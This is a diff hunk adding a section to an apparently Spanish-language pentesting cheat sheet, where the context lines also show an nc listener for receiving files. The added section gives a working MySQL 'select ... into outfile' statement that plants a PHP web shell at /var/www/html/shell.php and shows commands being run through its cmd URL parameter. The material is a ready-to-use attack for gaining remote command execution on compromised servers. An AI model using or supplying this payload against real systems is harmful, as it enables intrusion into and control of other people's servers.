@@ -31,6 +31,17 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 ❯ nc -nlvp 443 > file.txt              # El archivo que reciba lo colocara en file.txt (Maquina victima 'Recibe')
 ```
 
+## Reveseshell MySQL
+
+```bash 
+# Debemos estar dentro del servicio de MySQL
+
+❯ select '<?php  $output=shell_exec($_GET["cmd"]);echo "<prep>".$output."</prep>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1; 
+
+# Ahora en la URL podemos ejecutar comandos 
+❯ shell.php?cmd=whoami            
+```
+
 ## Reverse / Bind Shells directamente
 
 **Rever Shell:** 
